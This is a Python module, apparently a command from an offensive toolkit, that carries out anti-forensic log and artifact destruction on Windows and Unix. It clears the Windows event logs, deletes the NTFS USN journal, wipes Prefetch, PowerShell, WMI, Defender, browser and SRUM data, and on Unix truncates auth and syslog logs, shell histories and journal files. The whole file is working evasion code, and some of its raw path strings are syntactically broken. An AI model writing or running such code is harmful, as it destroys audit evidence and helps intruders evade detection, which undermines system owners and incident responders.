#!/usr/bin/env python3
"""
Elite ClearLogs Command Implementation - NO SUBPROCESS
Advanced log manipulation and forensic artifact removal using native APIs only
"""

import os
import sys
import time
import ctypes
from ctypes import wintypes
from typing import Dict, Any, List
import glob
import shutil

# Import our native API wrapper
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from api_wrappers import get_native_api, WindowsAPI

def elite_clearlogs(log_types: List[str] = None, selective: bool = False) -> Dict[str, Any]:
    """
    Elite log clearing with advanced features - NO SUBPROCESS
    - Multiple log type support
    - Anti-forensics techniques
    - Direct API access only
    """
    
    try:
        # Default log types if none specified
        if not log_types:
            if sys.platform == 'win32':
                log_types = ['System', 'Security', 'Application', 'Setup', 'PowerShell']
            else:
                log_types = ['auth', 'syslog', 'kern', 'messages', 'secure']
        
        # Apply platform-specific log clearing
        if sys.platform == 'win32':
            return _windows_clear_logs_native(log_types, selective)
        else:
            return _unix_clear_logs_native(log_types, selective)
            
    except Exception as e:
        return {
            "success": False,
            "error": f"Log clearing failed: {str(e)}",
            "cleared_logs": []
        }

def _windows_clear_logs_native(log_types: List[str], selective: bool) -> Dict[str, Any]:
    """Windows log clearing using ONLY native APIs - NO SUBPROCESS"""
    
    cleared_logs = []
    methods_used = []
    artifacts_cleared = []
    
    try:
        # Initialize Windows APIs
        advapi32 = ctypes.windll.advapi32
        kernel32 = ctypes.windll.kernel32
        
        # 1. Clear Windows Event Logs using native API
        for log_name in log_types:
            try:
                # Open event log
                h_log = advapi32.OpenEventLogW(None, log_name)
                if h_log:
                    # Clear the log
                    if advapi32.ClearEventLogW(h_log, None):
                        cleared_logs.append(log_name)
                    advapi32.CloseEventLog(h_log)
            except:
                pass
        
        if cleared_logs:
            methods_used.append("Windows Event Log API")
        
        # 2. Clear PowerShell history using direct file manipulation
        ps_history_paths = [
            os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
            os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
        ]
        
        for history_path in ps_history_paths:
            if os.path.exists(history_path):
                try:
                    # Overwrite with empty content
                    with open(history_path, 'w') as f:
                        f.write('')
                    artifacts_cleared.append("PowerShell History")
                except:
                    pass
        
        # 3. Clear Prefetch files using direct deletion
        prefetch_dir = r'C:\Windows\Prefetch'
        if os.path.exists(prefetch_dir) and _is_admin():
            try:
                for pf_file in glob.glob(os.path.join(prefetch_dir, '*.pf')):
                    try:
                        os.remove(pf_file)
                    except:
                        pass
                artifacts_cleared.append("Prefetch Files")
            except:
                pass
        
        # 4. Clear USN Journal using DeviceIoControl
        if _is_admin():
            try:
                _clear_usn_journal_native()
                artifacts_cleared.append("USN Journal")
            except:
                pass
        
        # 5. Clear WMI logs using direct file access
        wmi_log_paths = [
            r'C:\Windows\System32\LogFiles\WMI\',
            r'C:\Windows\System32\Wbem\Logs\'
        ]
        
        for wmi_path in wmi_log_paths:
            if os.path.exists(wmi_path):
                try:
                    for log_file in glob.glob(os.path.join(wmi_path, '*.log')):
                        try:
                            with open(log_file, 'w') as f:
                                f.write('')
                        except:
                            pass
                    artifacts_cleared.append("WMI Logs")
                    break
                except:
                    pass
        
        # 6. Clear SRUM database (System Resource Usage Monitor)
        srum_path = r'C:\Windows\System32\sru\SRUDB.dat'
        if os.path.exists(srum_path) and _is_admin():
            try:
                # Stop the service first using native API
                _stop_service_native('DPS')
                time.sleep(1)
                
                # Clear the database
                with open(srum_path, 'r+b') as f:
                    # Overwrite first 1MB with zeros
                    f.write(b'\x00' * 1048576)
                
                artifacts_cleared.append("SRUM Database")
                
                # Restart service
                _start_service_native('DPS')
            except:
                pass
        
        # 7. Clear browser artifacts
        browser_paths = {
            'Chrome': os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History'),
            'Firefox': os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles'),
            'Edge': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
        }
        
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                try:
                    if browser == 'Firefox':
                        # Handle Firefox profile directory
                        for profile_dir in glob.glob(os.path.join(path, '*.default*')):
                            history_file = os.path.join(profile_dir, 'places.sqlite')
                            if os.path.exists(history_file):
                                with open(history_file, 'w') as f:
                                    f.write('')
                    else:
                        # Chrome/Edge SQLite history
                        with open(path, 'w') as f:
                            f.write('')
                    
                    artifacts_cleared.append(f"{browser} History")
                except:
                    pass
        
        # 8. Clear Windows Defender logs
        defender_log_path = r'C:\ProgramData\Microsoft\Windows Defender\Support'
        if os.path.exists(defender_log_path):
            try:
                for log_file in glob.glob(os.path.join(defender_log_path, '*.log')):
                    try:
                        with open(log_file, 'w') as f:
                            f.write('')
                    except:
                        pass
                artifacts_cleared.append("Windows Defender Logs")
            except:
                pass
        
        return {
            "success": True,
            "cleared_logs": cleared_logs,
            "methods_used": methods_used,
            "artifacts_cleared": artifacts_cleared,
            "total_cleared": len(cleared_logs) + len(artifacts_cleared),
            "platform": "windows"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "cleared_logs": cleared_logs,
            "artifacts_cleared": artifacts_cleared
        }

def _unix_clear_logs_native(log_types: List[str], selective: bool) -> Dict[str, Any]:
    """Unix/Linux log clearing using ONLY native methods - NO SUBPROCESS"""
    
    cleared_logs = []
    artifacts_cleared = []
    
    try:
        # Common log file locations
        log_locations = {
            'auth': ['/var/log/auth.log', '/var/log/secure'],
            'syslog': ['/var/log/syslog', '/var/log/messages'],
            'kern': ['/var/log/kern.log', '/var/log/kernel.log'],
            'messages': ['/var/log/messages'],
            'secure': ['/var/log/secure'],
            'cron': ['/var/log/cron', '/var/log/cron.log'],
            'mail': ['/var/log/mail.log', '/var/log/maillog']
        }
        
        # Clear specified logs
        for log_type in log_types:
            if log_type in log_locations:
                for log_path in log_locations[log_type]:
                    if os.path.exists(log_path):
                        try:
                            # Try to truncate the file
                            with open(log_path, 'w') as f:
                                f.write('')
                            cleared_logs.append(log_path)
                        except PermissionError:
                            # Try with sudo privileges if available
                            try:
                                if os.geteuid() == 0:
                                    with open(log_path, 'w') as f:
                                        f.write('')
                                    cleared_logs.append(log_path)
                            except:
                                pass
        
        # Clear bash history
        bash_history_paths = [
            os.path.expanduser('~/.bash_history'),
            os.path.expanduser('~/.zsh_history'),
            os.path.expanduser('~/.history')
        ]
        
        for history_path in bash_history_paths:
            if os.path.exists(history_path):
                try:
                    with open(history_path, 'w') as f:
                        f.write('')
                    artifacts_cleared.append(os.path.basename(history_path))
                except:
                    pass
        
        # Clear systemd journal if root
        if os.geteuid() == 0:
            journal_path = '/var/log/journal'
            if os.path.exists(journal_path):
                try:
                    # Remove journal files
                    for root, dirs, files in os.walk(journal_path):
                        for file in files:
                            if file.endswith('.journal'):
                                try:
                                    os.remove(os.path.join(root, file))
                                except:
                                    pass
                    artifacts_cleared.append("systemd journal")
                except:
                    pass
        
        # Clear package manager logs
        pkg_logs = [
            '/var/log/apt/history.log',
            '/var/log/yum.log',
            '/var/log/dnf.log',
            '/var/log/pacman.log'
        ]
        
        for pkg_log in pkg_logs:
            if os.path.exists(pkg_log):
                try:
                    with open(pkg_log, 'w') as f:
                        f.write('')
                    artifacts_cleared.append(os.path.basename(pkg_log))
                except:
                    pass
        
        # Clear temporary files
        tmp_dirs = ['/tmp', '/var/tmp', '/dev/shm']
        for tmp_dir in tmp_dirs:
            if os.path.exists(tmp_dir):
                try:
                    # Remove files owned by current user
                    for item in os.listdir(tmp_dir):
                        item_path = os.path.join(tmp_dir, item)
                        try:
                            if os.path.isfile(item_path):
                                stat_info = os.stat(item_path)
                                if stat_info.st_uid == os.getuid():
                                    os.remove(item_path)
                        except:
                            pass
                except:
                    pass
        
        return {
            "success": True,
            "cleared_logs": cleared_logs,
            "artifacts_cleared": artifacts_cleared,
            "total_cleared": len(cleared_logs) + len(artifacts_cleared),
            "platform": "unix"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "cleared_logs": cleared_logs,
            "artifacts_cleared": artifacts_cleared
        }

def _is_admin() -> bool:
    """Check if running with administrator/root privileges"""
    try:
        if sys.platform == 'win32':
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False

def _clear_usn_journal_native():
    """Clear USN Journal using native Windows API - NO SUBPROCESS"""
    if sys.platform != 'win32':
        return
    
    try:
        kernel32 = ctypes.windll.kernel32
        
        # Open volume handle
        volume_handle = kernel32.CreateFileW(
            r'\\.\C:',
            0x40000000,  # GENERIC_WRITE
            0x00000001 | 0x00000002,  # FILE_SHARE_READ | FILE_SHARE_WRITE
            None,
            3,  # OPEN_EXISTING
            0,
            None
        )
        
        if volume_handle != -1:
            # USN_DELETE_USN_JOURNAL structure
            class USN_DELETE_USN_JOURNAL(ctypes.Structure):
                _fields_ = [
                    ("UsnJournalID", ctypes.c_uint64),
                    ("DeleteFlags", ctypes.c_uint32)
                ]
            
            delete_journal = USN_DELETE_USN_JOURNAL()
            delete_journal.UsnJournalID = 0
            delete_journal.DeleteFlags = 1  # USN_DELETE_FLAG_DELETE
            
            bytes_returned = ctypes.c_ulong()
            
            # FSCTL_DELETE_USN_JOURNAL = 0x000900F8
            kernel32.DeviceIoControl(
                volume_handle,
                0x000900F8,
                ctypes.byref(delete_journal),
                ctypes.sizeof(delete_journal),
                None,
                0,
                ctypes.byref(bytes_returned),
                None
            )
            
            kernel32.CloseHandle(volume_handle)
    except:
        pass

def _stop_service_native(service_name: str):
    """Stop Windows service using native API"""
    if sys.platform != 'win32':
        return
    
    try:
        advapi32 = ctypes.windll.advapi32
        
        # Open service control manager
        scm = advapi32.OpenSCManagerW(None, None, 0x0001)  # SC_MANAGER_CONNECT
        if scm:
            # Open service
            service = advapi32.OpenServiceW(scm, service_name, 0x0020)  # SERVICE_STOP
            if service:
                # Stop service
                service_status = ctypes.create_string_buffer(28)
                advapi32.ControlService(service, 1, service_status)  # SERVICE_CONTROL_STOP
                advapi32.CloseServiceHandle(service)
            advapi32.CloseServiceHandle(scm)
    except:
        pass

def _start_service_native(service_name: str):
    """Start Windows service using native API"""
    if sys.platform != 'win32':
        return
    
    try:
        advapi32 = ctypes.windll.advapi32
        
        # Open service control manager
        scm = advapi32.OpenSCManagerW(None, None, 0x0001)  # SC_MANAGER_CONNECT
        if scm:
            # Open service
            service = advapi32.OpenServiceW(scm, service_name, 0x0010)  # SERVICE_START
            if service:
                # Start service
                advapi32.StartServiceW(service, 0, None)
                advapi32.CloseServiceHandle(service)
            advapi32.CloseServiceHandle(scm)
    except:
        pass